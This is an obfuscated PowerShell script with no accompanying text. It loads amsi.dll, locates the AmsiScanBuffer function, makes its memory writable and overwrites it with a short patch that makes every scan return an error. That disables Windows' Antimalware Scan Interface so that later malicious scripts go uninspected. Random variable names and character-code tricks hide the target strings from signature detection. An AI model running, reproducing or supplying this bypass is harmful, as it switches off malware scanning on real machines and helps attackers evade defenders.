$x8b4pfBTluyVy = @"
using System;
using System.Runtime.InteropServices;
public class x8b4pfBTluyVy {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr z0utZNmVClVMQE, string p49j7HdmzP7igdW);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr fzLJFZpaDwNEFjy, UIntPtr SR2e31FiUe, uint ESgeY2z7, out uint cNJRVzD6DxnKJqT);
}
"@

Add-Type $x8b4pfBTluyVy

$kLko_xXbMcS2KsBoo = [x8b4pfBTluyVy]::LoadLibrary("$([ChaR]([ByTE]0x61)+[CHAr]([BYte]0x6d)+[chAR](115)+[ChAR]([Byte]0x69)+[cHAr](46*28/28)+[chAR](100)+[cHaR]([bYTE]0x6c)+[chAR]([BYTE]0x6c))")
$Dr6ZZV = [x8b4pfBTluyVy]::GetProcAddress($kLko_xXbMcS2KsBoo, "$(('ÀmsìScãn'+'Bùffér').normalIZe([char]([bYte]0x46)+[cHAR]([BYTe]0x6f)+[cHAr](114)+[cHAr]([byte]0x6d)+[ChaR](68*34/34)) -replace [cHaR](92)+[ChaR]([bYTE]0x70)+[cHAr]([bYte]0x7b)+[chAr]([byte]0x4d)+[cHaR]([BytE]0x6e)+[CHAR](125))")
$p = 0
[x8b4pfBTluyVy]::VirtualProtect($Dr6ZZV, [uint32]5, 0x40, [ref]$p)
$Vz4HTcuKiSj = "0xB8"
$SD6xbThDCgJj4Ll4 = "0x57"
$WXp8PMhWdbQvs = "0x00"
$_HZPHG5aL = "0x07"
$sOn = "0x80"
$ynO = "0xC3"
$nniA1zXVzG5gG6E6Lp = [Byte[]] ($Vz4HTcuKiSj,$SD6xbThDCgJj4Ll4,$WXp8PMhWdbQvs,$_HZPHG5aL,+$sOn,+$ynO)
[System.Runtime.InteropServices.Marshal]::Copy($nniA1zXVzG5gG6E6Lp, 0, $Dr6ZZV, 6)